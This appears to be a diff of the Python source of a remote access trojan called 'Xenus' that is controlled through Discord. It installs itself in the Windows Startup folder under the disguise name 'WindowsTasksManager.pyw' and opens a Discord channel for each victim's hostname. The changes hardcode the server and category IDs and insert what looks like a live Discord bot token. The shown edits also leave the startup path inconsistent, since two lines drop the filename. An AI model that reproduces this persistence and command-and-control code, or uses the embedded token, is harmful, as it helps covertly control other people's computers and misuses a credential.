@@ -1,20 +1,16 @@
 import os
 
 autostartup = True
-startupname = "WindowsTasksManager"
-statup_ext = "pyw"
-guild_id = 993120717019291721
-category_id = 993122405818044516
 
 def isinstartup():
-    startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup\{startupname}.{statup_ext}'
+    startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup'
     if os.path.isfile(startup):
         return True
     else:
         return False
 
 if autostartup:
-    startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup\{startupname}.{statup_ext}'
+    startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup'
     if os.getcwd() == startup:
         pass
     else:
@@ -373,11 +369,11 @@ async def mainui(channel, msg):
 async def on_ready():
     try:
         chaname =  get_hostname().lower().replace(" ", "-")
-        guild = bot.get_guild(guild_id)
+        guild = bot.get_guild(993120717019291721)
         for channel in guild.channels:
             if str(chaname) in channel.name:
                 await channel.delete()
-        cat = discord.utils.get(guild.categories, id=category_id)
+        cat = discord.utils.get(guild.categories, id=993122405818044516)
         channel = await guild.create_text_channel(str(chaname), category=cat)
         mainmsg = await channel.send('Xenus Is Loading...')
         while True:
@@ -405,7 +401,7 @@ async def on_ready():
                 button_text = inter.clicked_button.id
 
                 if button_text == "yes":
-                    startup = os.getenv('appdata')+f'\Microsoft\Windows\Start Menu\Programs\Startup\{startupname}.{statup_ext}'
+                    startup = os.getenv('appdata')+'\Microsoft\Windows\Start Menu\Programs\Startup\WindowsTasksManager.pyw'
                     try:
                         os.remove(startup)
                     except:
@@ -695,7 +691,7 @@ async def on_ready():
 
 
 try:
-    bot.run("BOT_TOKEN")
+    bot.run("OTkzMTIwNDAxOTgwOTI4MDgx.Gy1nmx.SrJBdasVXMNwispoWhGATS7qdyh5XRgB-9FtNA")
 except:
     os.system('cls')
     print('failed to run program, please update it')
